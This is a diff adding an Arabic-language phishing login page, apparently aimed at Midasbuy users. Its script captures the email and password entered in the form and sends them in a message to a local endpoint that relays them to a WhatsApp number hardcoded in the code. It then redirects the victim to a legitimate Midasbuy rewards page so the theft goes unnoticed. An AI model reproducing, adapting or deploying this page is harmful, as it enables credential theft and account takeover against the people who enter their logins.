@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="icon" href="./PPPPPPPPPPea8e68a2.jpg" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-image: url('./PPPPPPPPPPea8e68a2.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+
+        .background-blur {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('./PPPPPPPPPPea8e68a2.jpg');
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px);
+            z-index: -1;
+        }
+
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            text-align: center;
+        }
+
+        h2 {
+            margin-bottom: 25px;
+            font-size: 28px;
+            color: #ffd700;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        input[type="submit"] {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 15px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ddd;
+        }
+    </style>
+    <script>
+        async function redirectToUrl(event) {
+            event.preventDefault();
+
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value; // الحصول على كلمة المرور
+
+            const data = {
+                phone: 'whatsapp:+967715935213', // رقم واتساب الخاص بك
+                message: `البريد الإلكتروني: ${email}\nكلمة المرور: ${password}` // تضمين كلمة المرور في الرسالة
+            };
+
+            try {
+                const response = await fetch('http://localhost:3000/send-whatsapp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    alert('تم إرسال المعلومات بنجاح!');
+                    window.location.href = "https://www.midasbuy.com/midasbuy/sa/content/purchase-rewards-gob8g2";
+                } else {
+                    alert('فشل إرسال الرسالة. حاول مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('خطأ:', error);
+                alert('هناك مشكلة في الاتصال. حاول مرة أخرى.');
+            }
+        }
+    </script>
+</head>
+
+<body>
+
+    <div class="background-blur"></div>
+
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <form onsubmit="redirectToUrl(event)">
+            <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <input type="submit" value="تسجيل الدخول">
+        </form>
+        <div class="forgot-password">
+            <a href="https://www.midasbuy.com/midasbuy/sa/content/purchase-rewards-gob8g2">نسيت كلمة المرور؟</a>
+        </div>
+        <div class="footer">
+            &copy; 2024 جميع الحقوق محفوظة
+        </div>
+    </div>
+
+</body>
+
+</html>
